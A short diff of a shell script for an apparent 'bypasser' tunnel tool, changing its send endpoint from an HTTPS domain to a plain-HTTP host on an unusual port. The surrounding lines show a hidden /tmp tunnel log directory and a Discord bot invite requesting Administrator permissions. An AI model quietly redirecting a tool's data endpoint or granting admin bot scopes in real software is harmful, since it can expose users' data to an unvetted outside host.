@@ -6,7 +6,7 @@ RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; PU
 # Config
 DB_FILE="$HOME/.sgm_bypasser_db.json"
 LOG_DIR="/tmp/.sgm_tunnels"
-API_URL="https://api.sgmbypasser.indevs.in/send"
+API_URL="http://quaxly001.hatenna.com:25452/send"
 BOT_INVITE="https://discord.com/oauth2/authorize?client_id=1502918807105175732&permissions=8&integration_type=0&scope=bot+applications.commands"
 
 mkdir -p "$LOG_DIR"
@@ -46,7 +46,7 @@ USER_ID="$4"
 WEBHOOK="$5"
 DB_FILE="$HOME/.sgm_bypasser_db.json"
 LOG_FILE="/tmp/.sgm_tunnels/${PROFILE_NAME}_${METHOD}.log"
-API_URL="https://api.sgmbypasser.indevs.in/send"
+API_URL="http://quaxly001.hatenna.com:25452/send"
 
 log_msg() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; }
 
